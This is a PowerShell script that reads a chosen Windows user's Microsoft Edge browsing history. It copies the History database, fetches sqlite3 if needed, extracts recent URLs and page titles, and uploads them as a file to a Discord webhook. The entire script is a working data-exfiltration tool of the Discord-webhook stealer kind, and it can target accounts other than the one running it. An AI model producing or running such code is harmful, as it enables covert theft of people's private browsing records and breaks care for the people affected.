# Get Edge Browsing History for a Specific User and Send to Discord

param(
    [string]$GetUser = $env:USERNAME,
    [int]$DaysBack = 7
)

# Load environment variables from .env file
$envFile = Join-Path $PSScriptRoot ".env"
if (Test-Path $envFile) {
    Get-Content $envFile | ForEach-Object {
        if ($_ -match '^([^=]+)=(.*)$') {
            $key = $matches[1].Trim()
            $value = $matches[2].Trim()
            [Environment]::SetEnvironmentVariable($key, $value)
        }
    }
}

$webhookUrl = $env:WEBHOOK_URL
if (-not $webhookUrl) {
    Write-Error "Webhook URL not found. Ensure .env file exists in the script's directory with WEBHOOK_URL."
    exit
}

# Build Edge history path
$edgeHistoryPath = "C:\Users\$GetUser\AppData\Local\Microsoft\Edge\User Data\Default\History"
if (-not (Test-Path $edgeHistoryPath)) {
    Write-Error "Edge history file not found for user '$GetUser'. Path: $edgeHistoryPath"
    exit
}

# Copy the history file to temp (Edge may lock the file)
$tempHistory = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "$GetUser-EdgeHistory.db")
Copy-Item $edgeHistoryPath $tempHistory -Force

# Calculate Chrome/Edge epoch time for filtering
$now = Get-Date
$minDate = $now.AddDays(-$DaysBack)
# Chrome/Edge epoch is Jan 1, 1601 UTC
$epoch = [datetime]::Parse('1601-01-01T00:00:00Z')
$minVisitTime = [math]::Round(($minDate.ToUniversalTime() - $epoch).TotalMilliseconds * 10)

# Ensure sqlite3.exe is available, download if missing
$sqliteExe = Join-Path $PSScriptRoot "sqlite3.exe"
if (-not (Test-Path $sqliteExe)) {
    Write-Host "sqlite3.exe not found, downloading..."
    $sqliteUrl = "https://www.sqlite.org/2023/sqlite-tools-win32-x86-3430100.zip"
    $zipPath = Join-Path $env:TEMP "sqlite.zip"
    Invoke-WebRequest -Uri $sqliteUrl -OutFile $zipPath
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $PSScriptRoot)
    Remove-Item $zipPath
    $sqliteExe = Get-ChildItem -Path $PSScriptRoot -Filter "sqlite3.exe" -Recurse | Select-Object -First 1 | ForEach-Object { $_.FullName }
    if (-not $sqliteExe) {
        Write-Error "Failed to download sqlite3.exe."
        Remove-Item $tempHistory
        exit
    }
}

# Query the SQLite DB for URLs
try {
    $query = "SELECT url, title, last_visit_time FROM urls WHERE last_visit_time >= $minVisitTime ORDER BY last_visit_time DESC LIMIT 50;"
    $history = & $sqliteExe $tempHistory "$query"
} catch {
    Write-Error "Error querying Edge history: $_"
    Remove-Item $tempHistory
    exit
}

# Write results to temp file
$tempFile = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "$GetUser-EdgeHistory.txt")
"Edge Browsing History for user: $GetUser" | Out-File -FilePath $tempFile
"Source: $edgeHistoryPath" | Out-File -FilePath $tempFile -Append
"" | Out-File -FilePath $tempFile -Append
$history | Out-File -FilePath $tempFile -Append

# Send the file to Discord using HttpClient for multipart
try {
    Add-Type -AssemblyName System.Net.Http
    $client = New-Object System.Net.Http.HttpClient
    $content = New-Object System.Net.Http.MultipartFormDataContent
    $content.Add([System.Net.Http.StringContent]::new(":file_folder: Edge history attached."), "content")
    $fileStream = [System.IO.File]::OpenRead($tempFile)
    $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
    $content.Add($fileContent, "file", [System.IO.Path]::GetFileName($tempFile))
    $response = $client.PostAsync($webhookUrl, $content).Result
    if (-not $response.IsSuccessStatusCode) {
        Write-Error "Failed to send to Discord: $($response.StatusCode) - $($response.ReasonPhrase)"
    }
} catch {
    Write-Error "Error sending to Discord: $_"
} finally {
    if ($fileStream) { $fileStream.Close() }
    if ($client) { $client.Dispose() }
}

# Clean up temp files
Remove-Item $tempHistory
Remove-Item $tempFile
